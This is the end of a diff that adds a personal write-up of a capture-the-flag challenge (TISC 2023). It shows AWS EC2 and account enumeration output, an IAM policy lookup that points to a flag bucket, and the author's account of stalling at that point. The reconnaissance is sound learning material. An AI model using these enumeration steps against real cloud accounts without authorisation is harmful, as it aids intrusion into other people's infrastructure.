+                    "NetworkInterfaceId": "eni-049d23f49ac0d3c2c",
+                    "OwnerId": "232705437403",
+                    "PrivateDnsName": "ip-192-168-0-112.ap-southeast-1.compute.internal",
+                    "PrivateIpAddress": "192.168.0.112",
+                    "PrivateIpAddresses": [
+                        {
+                            "Association": {
+                                "IpOwnerId": "amazon",
+                                "PublicDnsName": "ec2-54-255-155-134.ap-southeast-1.compute.amazonaws.com",
+                                "PublicIp": "54.255.155.134"
+                            },
+                            "Primary": true,
+                            "PrivateDnsName": "ip-192-168-0-112.ap-southeast-1.compute.internal",
+                            "PrivateIpAddress": "192.168.0.112"
+                        }
+                    ],
+                    "SourceDestCheck": true,
+                    "Status": "in-use",
+                    "SubnetId": "subnet-0e7baa8cdf3a7fd1b",
+                    "VpcId": "vpc-063e577d022d3fa3b",
+                    "InterfaceType": "interface"
+                }
+            ],
+            "RootDeviceName": "/dev/sda1",
+            "RootDeviceType": "ebs",
+            "SecurityGroups": [
+                {
+                    "GroupName": "Generic network for staging and production",
+                    "GroupId": "sg-0c178b9e55483a8da"
+                }
+            ],
+            "SourceDestCheck": true,
+            "VirtualizationType": "hvm",
+            "CpuOptions": {
+                "CoreCount": 1,
+                "ThreadsPerCore": 2
+            },
+            "CapacityReservationSpecification": {
+                "CapacityReservationPreference": "open"
+            },
+            "MetadataOptions": {
+                "State": "applied",
+                "HttpTokens": "optional",
+                "HttpPutResponseHopLimit": 1,
+                "HttpEndpoint": "enabled",
+                "HttpProtocolIpv6": "disabled",
+                "InstanceMetadataTags": "disabled"
+            },
+            "PlatformDetails": "Linux/UNIX",
+            "UsageOperation": "RunInstances",
+            "UsageOperationUpdateTime": "Fri, 21 Jul 2023 15:05:29",
+            "PrivateDnsNameOptions": {
+                "HostnameType": "ip-name"
+            },
+            "MaintenanceOptions": {
+                "AutoRecovery": "default"
+            },
+            "CurrentInstanceBootMode": "legacy-bios",
+            "Region": "ap-southeast-1"
+        },
+        {
+            "ImageId": "ami-0df7a207adb9748c7",
+            "InstanceId": "i-02423bae26b4cfd9a",
+            "InstanceType": "t3a.small",
+            "LaunchTime": "Sat, 16 Sep 2023 07:06:20",
+            "Monitoring": {
+                "State": "disabled"
+            },
+            "Placement": {
+                "AvailabilityZone": "ap-southeast-1a",
+                "Tenancy": "default"
+            },
+            "PrivateDnsName": "ip-192-168-0-172.ap-southeast-1.compute.internal",
+            "PrivateIpAddress": "192.168.0.172",
+            "PublicDnsName": "ec2-13-213-29-24.ap-southeast-1.compute.amazonaws.com",
+            "PublicIpAddress": "13.213.29.24",
+            "State": {
+                "Code": 16,
+                "Name": "running"
+            },
+            "SubnetId": "subnet-0e7baa8cdf3a7fd1b",
+            "VpcId": "vpc-063e577d022d3fa3b",
+            "Architecture": "x86_64",
+            "BlockDeviceMappings": [
+                {
+                    "DeviceName": "/dev/sda1",
+                    "Ebs": {
+                        "AttachTime": "Sat, 16 Sep 2023 07:06:20",
+                        "DeleteOnTermination": true,
+                        "Status": "attached",
+                        "VolumeId": "vol-0429e09162524aa33"
+                    }
+                }
+            ],
+            "ClientToken": "terraform-20230916070619552900000001",
+            "EnaSupport": true,
+            "Hypervisor": "xen",
+            "NetworkInterfaces": [
+                {
+                    "Association": {
+                        "IpOwnerId": "amazon",
+                        "PublicDnsName": "ec2-13-213-29-24.ap-southeast-1.compute.amazonaws.com",
+                        "PublicIp": "13.213.29.24"
+                    },
+                    "Attachment": {
+                        "AttachTime": "Sat, 16 Sep 2023 07:06:20",
+                        "AttachmentId": "eni-attach-01bc5e45e2c2c672f",
+                        "DeleteOnTermination": true,
+                        "Status": "attached"
+                    },
+                    "Groups": [
+                        {
+                            "GroupName": "Generic network for staging and production",
+                            "GroupId": "sg-0c178b9e55483a8da"
+                        }
+                    ],
+                    "MacAddress": "02:e5:c1:c3:47:20",
+                    "NetworkInterfaceId": "eni-05a6609c4a1cd826d",
+                    "OwnerId": "232705437403",
+                    "PrivateDnsName": "ip-192-168-0-172.ap-southeast-1.compute.internal",
+                    "PrivateIpAddress": "192.168.0.172",
+                    "PrivateIpAddresses": [
+                        {
+                            "Association": {
+                                "IpOwnerId": "amazon",
+                                "PublicDnsName": "ec2-13-213-29-24.ap-southeast-1.compute.amazonaws.com",
+                                "PublicIp": "13.213.29.24"
+                            },
+                            "Primary": true,
+                            "PrivateDnsName": "ip-192-168-0-172.ap-southeast-1.compute.internal",
+                            "PrivateIpAddress": "192.168.0.172"
+                        }
+                    ],
+                    "SourceDestCheck": true,
+                    "Status": "in-use",
+                    "SubnetId": "subnet-0e7baa8cdf3a7fd1b",
+                    "VpcId": "vpc-063e577d022d3fa3b",
+                    "InterfaceType": "interface"
+                }
+            ],
+            "RootDeviceName": "/dev/sda1",
+            "RootDeviceType": "ebs",
+            "SecurityGroups": [
+                {
+                    "GroupName": "Generic network for staging and production",
+                    "GroupId": "sg-0c178b9e55483a8da"
+                }
+            ],
+            "SourceDestCheck": true,
+            "VirtualizationType": "hvm",
+            "CpuOptions": {
+                "CoreCount": 1,
+                "ThreadsPerCore": 2
+            },
+            "CapacityReservationSpecification": {
+                "CapacityReservationPreference": "open"
+            },
+            "MetadataOptions": {
+                "State": "applied",
+                "HttpTokens": "optional",
+                "HttpPutResponseHopLimit": 1,
+                "HttpEndpoint": "enabled",
+                "HttpProtocolIpv6": "disabled",
+                "InstanceMetadataTags": "disabled"
+            },
+            "PlatformDetails": "Linux/UNIX",
+            "UsageOperation": "RunInstances",
+            "UsageOperationUpdateTime": "Sat, 16 Sep 2023 07:06:20",
+            "PrivateDnsNameOptions": {
+                "HostnameType": "ip-name"
+            },
+            "MaintenanceOptions": {
+                "AutoRecovery": "default"
+            },
+            "CurrentInstanceBootMode": "legacy-bios",
+            "Region": "ap-southeast-1"
+        }
+    ]
+}
+Account: {
+    "account_id": "232705437403",
+    "account_iam_alias": "<NotFound>",
+    "account_total_spend": "<unauthorized>",
+    "org_data": {
+        "error": "Not Authorized to get Organization Data"
+    }
+}
+```
+
+At the same time, I also had a rough idea that flag2 was related to EC2, as in my previous enumeration, i also found related snippets for flag2 when enumerating policies. Which also gave me the rough direction: i had to somehow get access to the `devsecmeow2023flag2` bucket. (which is likely accessible from 54.255.155.134)
+
+`aws iam get-policy-version --policy-arn arn:aws:iam::232705437403:policy/iam_policy_for_ec2_production_role --version-id v1`
+
+```python
+{
+    "PolicyVersion": {
+        "Document": {
+            "Statement": [
+                {
+                    "Action": [
+                        "s3:GetObject"
+                    ],
+                    "Effect": "Allow",
+                    "Resource": [
+                        "arn:aws:s3:::devsecmeow2023flag2/index.html"
+                    ],
+                    "Sid": "VisualEditor0"
+                }
+            ],
+            "Version": "2012-10-17"
+        },
+        "VersionId": "v1",
+        "IsDefaultVersion": true,
+        "CreateDate": "2023-07-21T15:05:07+00:00"
+    }
+}
+```
+
+At this point, i was trying many different stuffs (which didn’t work ofc, as i only solved till level 6) and lots of enumeration. Unfortunately i wasn’t able to continue further from here.. Enumeration was probably lacking? I was also studying for OSCP and school, so after a day or two of trying without any further progress, I decided to call it quits on the CTF as i had to focus on other things. The challenge server is already down, so looking to read writeups from others on how they solved part 2!
+
+Overall, I learnt quite alot from the challenges! Fun CTF and hopefully would be able to do better if i do participate in the future editions of TISC.
